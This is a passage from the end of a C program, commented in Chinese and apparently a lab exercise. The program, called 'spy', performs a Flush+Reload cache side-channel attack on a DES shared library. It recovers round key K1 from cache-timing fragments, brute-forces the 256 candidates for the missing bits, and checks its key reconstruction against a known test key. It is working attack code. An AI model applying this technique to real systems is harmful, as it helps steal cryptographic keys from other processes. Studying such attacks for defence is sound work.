    printf("\nBest K1 (confidence %d, fragments %d): %012lX\n", 
           k1_confidence[best_idx], k1_valid_frags[best_idx], (unsigned long)derived_K1);
    
    // 生成测试密文用于验证候选密钥
    uint64_t test_ciphertext;
    des_encrypt_full(TEST_PLAINTEXT, key, &test_ciphertext);
    printf("Test ciphertext: %016lX\n", (unsigned long)test_ciphertext);
    
    // 步骤 5：暴力搜索
    // 从 K1 恢复 64 位密钥：需要枚举 8 个未知位（PC-2 未选中的位）
    // 共 2^8 = 256 种可能
    printf("\n=== Brute Force Search ===\n");
    uint64_t recovered_key = 0;
    bool key_found = false;
    
    for (int missing = 0; missing < 256; missing++) {
        // 构建候选密钥
        uint64_t candidate = build_candidate_key_64bit(derived_K1, (uint8_t)missing);
        
        // 验证：使用候选密钥加密明文，检查是否得到相同密文
        uint64_t result;
        des_encrypt_full(TEST_PLAINTEXT, candidate, &result);
        
        if (result == test_ciphertext) {
            recovered_key = candidate;
            key_found = true;
            printf("Found key: %016lX (missing_bits: %02X)\n", 
                   (unsigned long)recovered_key, missing);
            break;
        }
        
        // 进度显示
        if (missing % 32 == 0) {
            printf("Searching... %d/256\r", missing);
            fflush(stdout);
        }
    }
    
    // 输出最终结果
    if (key_found && recovered_key == key) {
        printf("\n✅ Success! Key recovered: %016lX\n", (unsigned long)recovered_key);
    } else if (key_found) {
        printf("\n❌ Key collision found: %016lX (expected: %016lX)\n", 
               (unsigned long)recovered_key, (unsigned long)key);
    } else {
        printf("\n❌ Failed to recover key.\n");
    }
    
    unload_des_library();
}

/**
 * test_key_reconstruction - 测试密钥重建逻辑的正确性
 * 
 * 功能：验证从正确的 K1 能否成功重建原始密钥
 * 用途：在正式攻击前确保密钥重建逻辑无误
 * 
 * 参数：
 *   lib_path - DES 共享库路径
 */
bool test_key_reconstruction(const char *lib_path) {
    printf("Testing key reconstruction logic...\n");
    
    if (load_des_library(lib_path) != 0) return false;
    
    bool test_success = false;
    uint64_t original_key = KEY_TEST_1;
    printf("Original: %016lX\n", (unsigned long)original_key);
    
    // 计算正确的 K1（用于验证）
    // 步骤 1：PC-1 置换，64 位 -> 56 位
    uint64_t c0d0 = 0;
    for (int i = 0; i < 56; i++) {
        uint8_t bit = (original_key >> (64 - PC1[i])) & 1;
        c0d0 |= ((uint64_t)bit) << (55 - i);
    }
    
    // 步骤 2：循环左移 1 位得到 C1D1
    uint32_t c0 = (c0d0 >> 28) & 0x0FFFFFFF;
    uint32_t d0 = c0d0 & 0x0FFFFFFF;
    uint32_t c1 = ((c0 << 1) | (c0 >> 27)) & 0x0FFFFFFF;
    uint32_t d1 = ((d0 << 1) | (d0 >> 27)) & 0x0FFFFFFF;
    uint64_t c1d1 = ((uint64_t)c1 << 28) | d1;
    
    // 步骤 3：PC-2 置换，56 位 -> 48 位得到 K1
    uint64_t correct_K1 = 0;
    for (int i = 0; i < 48; i++) {
        uint8_t bit = (c1d1 >> (56 - PC2[i])) & 1;
        correct_K1 |= ((uint64_t)bit) << (47 - i);
    }
    printf("Correct K1: %012lX\n", (unsigned long)correct_K1);
    
    // 测试重建：验证从正确的 K1 暴力搜索原始密钥的逻辑是不是正确
    uint64_t test_cipher;  // 正确的密文
    des_encrypt_full(TEST_PLAINTEXT, original_key, &test_cipher);
    
    for (int missing = 0; missing < 256; missing++) {
        uint64_t candidate = build_candidate_key_64bit(correct_K1, (uint8_t)missing);
        uint64_t result;
        des_encrypt_full(TEST_PLAINTEXT, candidate, &result);
        
        if (result == test_cipher) {
            printf("Reconstruction test: %s\n", 
                   candidate == original_key ? "✅ PASSED" : "⚠️ Collision");
            test_success = true;
            break;
        }
    }
    
    unload_des_library();
    return test_success;
}

/* ==================== 程序入口 ==================== */

/**
 * main - 程序入口
 * 
 * 用法：./spy <libdes.so>
 * 
 * 流程：
 * 1. 测试密钥重建逻辑
 * 2. 执行完整的 Flush+Reload 攻击
 */
int main(int argc, char *argv[]) {
    // 检查命令行参数
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <libdes.so>\n", argv[0]);
        return 1;
    }
    
    // 提高进程优先级（可选，需要 sudo）
    // nice(-20) 将进程优先级设为最高
    if (nice(-20) == -1) {
        perror("Warning: nice failed (run with sudo for best results)");
    }
    
    // 步骤 1：测试密钥重建逻辑
    bool test_success = test_key_reconstruction(argv[1]);
    if (!test_success) {
        fprintf(stderr, "Key reconstruction test failed, aborting.\n");
        return 1;
    }

    // 步骤 2：执行完整攻击
    printf("\n========================================\n");
    attack_des_full(argv[1], KEY_TEST_1);
    
    return 0;
}
